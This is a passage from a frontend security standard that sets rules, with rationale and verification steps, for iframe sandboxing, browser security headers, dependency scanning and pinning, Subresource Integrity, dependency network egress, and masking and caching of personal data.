**Rationale:** Without `sandbox`, an embedded document can run scripts, submit forms, open popups, trigger downloads, and attempt to navigate the top-level page. An empty `sandbox` blocks each of these and treats the content as a unique origin, and the embedding page re-grants only what the embed needs, one token at a time, without depending on the framed document's server. The `allow-scripts` + `allow-same-origin` combination is a documented escape hatch when the framed document shares the parent's origin: it keeps that origin instead of an opaque one, so the same-origin policy lets its scripts reach `parent.document`, strip the frame's `sandbox` attribute, and reload unsandboxed. A cross-origin frame granted both tokens runs with its own origin and still cannot reach the parent's DOM, so the pair can be a justified grant there rather than an escape; untrusted content that needs scripts belongs on a separate origin for exactly this reason.

**Verification:** Any spec or plan that introduces iframes embedding non-fully-controlled content MUST commit to a `sandbox` value and MUST justify each token included. `/{project}:analyze` flags iframe specs that omit `sandbox`, that use it without naming the included tokens, or that combine `allow-scripts` with `allow-same-origin` on a frame whose content is served from the embedding page's origin.

**Source:** OWASP HTML5 Security Cheat Sheet, MDN iframe sandbox documentation

### FE-CSP-007

> HTML responses MUST set the `Permissions-Policy` header (formerly `Feature-Policy`) restricting access to powerful browser features the application does not use. At minimum, features with privacy or security impact MUST be explicitly denied unless the application genuinely needs them: `camera=()`, `microphone=()`, `geolocation=()`, `payment=()`, `usb=()`. Features the application uses MUST be scoped to `self` (or an explicit origin allowlist) rather than left open.

**Rationale:** Powerful features such as camera, microphone, geolocation, payment, and USB default to an allowlist of `self`: cross-origin iframes cannot use them unless the page delegates them through the iframe `allow` attribute, but every script running in the page itself — including one injected through XSS or a compromised third-party script — can prompt the user for them. Denying the features the application never uses removes that prompt surface and caps what any `allow` attribute can delegate. The header is honored by Chromium-based browsers only (Firefox and Safari ignore it), so it is defense in depth that narrows what a successful injection can ask Chromium users for, not a substitute for preventing the injection. The former `interest-cohort=()` entry is no longer required: it opted a page out of FLoC's, and later the Topics API's, advertising-interest calculation — a privacy opt-out, not a powerful feature a script can prompt the user for.

**Verification:** Any spec or plan that describes serving HTML responses MUST commit to a `Permissions-Policy` header naming the denied and allowed features. `/{project}:analyze` flags HTML-serving specs that omit `Permissions-Policy`, that leave privacy-sensitive features unrestricted, or that grant features without an origin scope.

**Source:** W3C Permissions Policy specification, OWASP HTTP Headers Cheat Sheet, MDN Permissions-Policy documentation (including browser compatibility), Topics API explainer

### FE-CSP-008

> Legacy `X-Frame-Options: DENY` (or `SAMEORIGIN` where same-origin framing is required) SHOULD also be set as a clickjacking fallback for browsers that do not honor `frame-ancestors`.

**Rationale:** `X-Frame-Options` covers older browsers that do not implement CSP Level 2, where the `frame-ancestors` directive `FE-CSP-003` requires has no effect. `BE-API-012` states the same fallback for a backend that serves HTML without loading this file.

**Verification:** Any spec or plan that describes serving HTML responses SHOULD commit to `X-Frame-Options: DENY` (or `SAMEORIGIN`). `/{project}:analyze` emits a warning when HTML-serving specs omit `X-Frame-Options`.

**Source:** OWASP HTTP Headers Cheat Sheet, OWASP Clickjacking Defense Cheat Sheet

### FE-CSP-009

> HTML responses SHOULD set `Cross-Origin-Opener-Policy: same-origin`, or `same-origin-allow-popups` on a page that opens cross-origin popups which must keep their reference to it (OAuth or payment popups that report back through `window.opener`).

**Rationale:** Under the default `unsafe-none`, a page that another site opens with `window.open()` shares a browsing context group with its opener, which keeps a live window reference to it. Through that reference the opener can reach the page's global object and read cross-origin state such as how many frames it contains (`window.length`) — the cross-site leak (XS-Leaks) family. `same-origin` opens the document in a new browsing context group unless its opener is same-origin and also sets `same-origin`, severing the reference; `same-origin-allow-popups` additionally keeps the reference to popups the page itself opens with `window.open()` when they set no policy of their own (`unsafe-none`). `Cross-Origin-Embedder-Policy` and full cross-origin isolation are needed only for features such as `SharedArrayBuffer` and are outside this rule.

**Verification:** Any spec or plan that describes serving HTML responses SHOULD commit to a `Cross-Origin-Opener-Policy` value, naming the popup flow wherever it chooses `same-origin-allow-popups` over `same-origin`. `/{project}:analyze` emits a warning when HTML-serving specs omit `Cross-Origin-Opener-Policy` or set it to `unsafe-none` without justification.

**Source:** OWASP HTTP Headers Cheat Sheet, MDN Cross-Origin-Opener-Policy documentation, XS-Leaks Wiki

## FE-DEPS — Dependency Management

### FE-DEPS-001

> Frontend dependencies MUST be scanned for known vulnerabilities before every release and on a recurring schedule between releases; dependencies with known critical or high-severity vulnerabilities MUST be updated, replaced, or accompanied by a documented exception with a remediation date.

**Rationale:** Frontend dependencies are an active and well-traveled supply-chain attack surface — a single compromised npm package can ship malicious code into production for every deploying project. Scanning before each release keeps a known vulnerability from shipping, and scanning on a schedule catches advisories disclosed against code already deployed; an explicit policy on findings ensures issues are addressed rather than buried. How the scan runs — a CI job, a scheduled job, a dependency bot — is the project's choice; `FE-DEPS-006` recommends also scanning each dependency change.

**Verification:** Any spec or plan covering frontend dependency management, builds, or `system.md` MUST name the vulnerability scanner (Snyk, Dependabot, `npm audit`, `pnpm audit`, `yarn npm audit` or Yarn 1's `yarn audit`, OWASP Dependency-Check), when it runs (before release and on what schedule), AND the policy on critical/high findings (block the release, file an issue, alert on-call). `/{project}:analyze` flags dependency specs that omit any of the three commitments.

**Source:** OWASP Dependency-Check, OWASP Top 10:2025 (A03:2025 — Software Supply Chain Failures, an expansion of A06:2021 — Vulnerable and Outdated Components)

### FE-DEPS-002

> Third-party scripts and stylesheets loaded from cross-origin CDNs MUST include **both** the `integrity` attribute (with a valid Subresource Integrity hash) **and** the `crossorigin` attribute (typically `crossorigin="anonymous"`). A cross-origin script referenced from markup or build output without integrity verification MUST NOT be loaded; scripts injected at runtime are governed by `FE-DEPS-003`.

**Rationale:** CDN compromise, DNS hijacking, and registry tampering can replace a legitimate third-party asset with malicious content. SRI ensures the browser computes and verifies the asset's hash against the declared value before executing it. Without `crossorigin`, a cross-origin asset is fetched in `no-cors` mode, and browsers refuse to apply SRI to a `no-cors` response (an integrity check on an opaque response would be a cross-origin content oracle): the load fails with a network error, so `integrity` without `crossorigin` breaks the page rather than protecting it. The CDN must also answer with a matching `Access-Control-Allow-Origin` header for the CORS-mode fetch to succeed. So the two attributes have to appear together.

**Verification:** Any spec or plan that describes loading scripts, stylesheets, or modules from external origins MUST commit to SRI **plus** `crossorigin` on every cross-origin asset and MUST commit to refusing to load assets without an integrity check. `/{project}:analyze` flags HTML-template or build-output specs that name third-party CDNs, externally hosted scripts, or remotely loaded modules without naming both attributes.

**Source:** MDN Subresource Integrity documentation, W3C Subresource Integrity specification, OWASP CSP Cheat Sheet

### FE-DEPS-003

> The application MUST NOT dynamically inject a script from a third-party origin at runtime (ad-hoc `document.createElement('script')` or equivalent pointing at an external URL) unless the load carries integrity verification or is gated by a CSP-and-vendor-review process.

**Rationale:** Dynamically loaded scripts can change between page loads — a registry hash or build-time SRI value cannot be computed for content that varies per request. Combined with relaxed CSP entries (e.g., `script-src https:`), dynamic third-party loads create a permanent injection surface.

**Verification:** Any spec or plan that describes runtime third-party integrations (analytics, A/B testing, support widgets, embed providers) MUST commit to bundling the third-party code with build-time SRI, to integrity verification on the runtime-injected script, or to a CSP-and-vendor-review process for the runtime load. `/{project}:analyze` flags integration specs that describe creating script elements pointing to external URLs without naming an integrity or CSP-trust commitment.

**Source:** OWASP CSP Cheat Sheet

### FE-DEPS-004

> Production frontend dependencies MUST be pinned to specific versions (or version + integrity hash) in the lockfile used for production builds; floating versions (`latest`, `^`, `~`, range constraints) MUST NOT determine what ships to production.

**Rationale:** Floating versions admit supply-chain attacks via a compromised release of a dependency, and make production debugging guesswork — the same `package.json` resolves to different versions on different days. Pinned versions in `package-lock.json`, `pnpm-lock.yaml`, or `yarn.lock` plus an explicit upgrade process keep deployments deterministic and auditable. This rule mirrors `BE-DEPS-002` for the frontend toolchain.

**Verification:** Any spec or plan covering frontend builds, deployment, or `system.md` MUST commit to (a) an authoritative lockfile (`package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`) included in the deployment artifact and (b) a documented upgrade process. `/{project}:analyze` flags deployment specs that allow floating dependency ranges in production builds, that omit the lockfile question, or that describe a production install able to rewrite the lockfile: `npm install` rather than `npm ci`, `pnpm install` without `--frozen-lockfile`, or a Yarn install without `--immutable` (Yarn 1: `--frozen-lockfile`), except where pnpm or Yarn 3+ already applies that behavior by default because it detects a CI environment.

**Source:** OWASP Top 10:2025 (A03:2025 — Software Supply Chain Failures), npm `ci` documentation, pnpm `install` documentation, Yarn `install` documentation

### FE-DEPS-005

> A frontend dependency MUST NOT originate network requests to third-party origins as a side effect of being used. Telemetry, usage analytics, license checks, and update polling performed by a dependency MUST be disabled at build time through the opt-out the dependency provides, and the opt-out MUST apply to every build configuration the team runs, not only to production builds. An intentional third-party integration is exempt only when it is a declared part of the application's design, permitted explicitly by the CSP `connect-src` directive, and vendor reviewed. Verification that no unintended egress occurs MUST be performed against a production build, since a dependency's network behavior may differ by build configuration.

**Rationale:** The other `FE-DEPS` rules govern what code is loaded and from where; none governs what a dependency does on the network once it runs. A package can be pinned, scanned, and bundled locally — satisfying every existing rule — while still contacting its vendor on every application start. Such calls leak the fact of usage, and often version, locale, and coarse environment fingerprints, to a party the team never chose to inform. Two properties make this class of defect persistently hard to catch: it is invisible in the UI, and it frequently differs between development and production builds, so a dependency that is silent in a shipped bundle may report from every workstation. Development machines sit on corporate networks and VPNs and are not a safe default destination for that traffic. For air-gapped or otherwise egress-controlled deployments, an unannounced outbound call is an outright deployment defect rather than a privacy preference.

**Verification:** Any spec or plan that introduces or upgrades a frontend dependency shipping to the browser MUST state whether that dependency performs network egress of its own and, where it does, name the documented opt-out and the build configurations the opt-out covers. `/{project}:analyze` flags specs adopting UI component libraries, analytics-capable SDKs, error/crash reporters, font or icon providers, and map or media embeds without addressing dependency egress. `/{project}:analyze` also flags a verification commitment that names only a development-server check, since dev-only behavior is not representative.

**Source:** OWASP Top 10:2025 (A03:2025 — Software Supply Chain Failures); OWASP Top 10 Client-Side Security Risks (candidate list: Sensitive Data Leakage, Lack of Third-party Origin Control)

### FE-DEPS-006

> The vulnerability scan of `FE-DEPS-001` SHOULD also run automatically on every change that alters the frontend dependency set — the manifest or the lockfile — so a vulnerable package is caught on the change that introduces it.

**Rationale:** A scan that runs only at release or on a schedule finds a vulnerable package after the change that added it has merged and become entangled with other work. Scanning each dependency change attributes the finding to its cause while that change is still under review. Where the scan runs — CI, a pre-commit hook, a dependency bot — is adopter-owned and outside what a spec or plan can bind, so this rule is advisory.

**Verification:** Any spec or plan covering frontend dependency management or CI configuration SHOULD commit to an automated scan on dependency changes. `/{project}:analyze` emits a warning when such a spec omits it.

**Source:** OWASP Dependency-Check, OWASP Top 10:2025 (A03:2025 — Software Supply Chain Failures)

## FE-PII — Sensitive Data Handling

### FE-PII-001

> When personally identifiable information is rendered in the UI, the value MUST be masked or partially redacted unless the full value is required for the user's task; reveal-on-demand interactions (click-to-reveal, hover-with-delay) MUST require an explicit user action.

**Rationale:** Shoulder surfing, screenshots, screen sharing, and over-the-shoulder support sessions can expose PII rendered in full. Masking limits the exposure surface while preserving the value's identifying utility (last four digits of a phone, masked email, redacted SSN).

**Verification:** Any spec or plan that introduces UI surfaces displaying PII, financial data, or government IDs MUST name the masking strategy (which characters are visible, which are redacted) and any reveal mechanism. `/{project}:analyze` flags UI specs that render full PII fields without a masking commitment or reveal-on-demand interaction.

**Source:** PCI DSS v4.0.1 Requirement 3.4.1 (PAN masked when displayed), NIST SP 800-122 section 4.2.1 (minimizing the use of PII)

### FE-PII-002

> Forms collecting credentials, multi-factor codes, and payment data MUST set the appropriate `autocomplete` token (`current-password`, `new-password`, `cc-number`, `one-time-code`, etc.) so browsers and password managers can offer autofill and generated passwords; blanket `autocomplete="off"` on credential and payment fields MUST NOT be used as the default posture.

**Rationale:** Current guidance reverses the older "always `autocomplete=off`" advice: NIST SP 800-63B-4 requires verifiers to allow password managers and autofill, and the OWASP Authentication Cheat Sheet asks applications not to make a password manager's job harder. In most modern browsers `autocomplete="off"` does not stop a password manager from offering to save or fill a login form anyway, so it buys little while withholding the tokens that let a browser fill the right field and offer a generated password for a `new-password` field. `off` is appropriate only for narrow, justified cases, such as a CAPTCHA answer.

**Verification:** Any spec or plan that introduces credential, MFA, or payment forms MUST name the `autocomplete` token per field. `/{project}:analyze` flags form specs that set `autocomplete="off"` blanketly across credential or payment inputs without justification, and flags credential forms that omit the `autocomplete` question entirely.

**Source:** OWASP Authentication Cheat Sheet (Password Managers), MDN HTML attribute: autocomplete, NIST SP 800-63B-4 section 3.1.1.2

### FE-PII-003

> Pages displaying sensitive data MUST set `Cache-Control: no-store` to prevent browser, intermediate, and shared caching.

**Rationale:** Cached responses persist on disk and can be recovered after the session ends — by another user on a shared machine, a forensic analyst, or anyone with disk access. The header governs HTTP caches only; the Cache API a service worker writes ignores it, which is `FE-STORAGE-006`'s concern.

**Verification:** Any spec or plan that describes authenticated pages MUST commit to `Cache-Control: no-store` on sensitive responses. `/{project}:analyze` flags authenticated-page specs that omit `Cache-Control: no-store`.

**Source:** OWASP Session Management Cheat Sheet, MDN Cache-Control documentation

### FE-PII-004

> The logout response SHOULD include `Clear-Site-Data: "cache", "cookies", "storage"` to evict client-side artifacts.

**Rationale:** `Cache-Control: no-store` (`FE-PII-003`) keeps sensitive responses out of caches, but artifacts already stored on the client survive the session. `Clear-Site-Data` instructs the browser to evict them at logout, closing the post-session leakage window. The `"cookies"` directive clears cookies for the entire registrable domain, subdomains included, so a logout on one subdomain also ends sessions held by sibling applications on that domain; a deployment that shares a domain with other applications names that effect or omits `"cookies"` and relies on server-side invalidation (`FE-AUTHN-003`).

**Verification:** Any spec or plan that describes logout flows SHOULD commit to `Clear-Site-Data` on the logout response. `/{project}:analyze` emits a warning when logout flows omit `Clear-Site-Data`.

**Source:** OWASP Session Management Cheat Sheet, MDN Clear-Site-Data documentation, W3C Clear Site Data specification
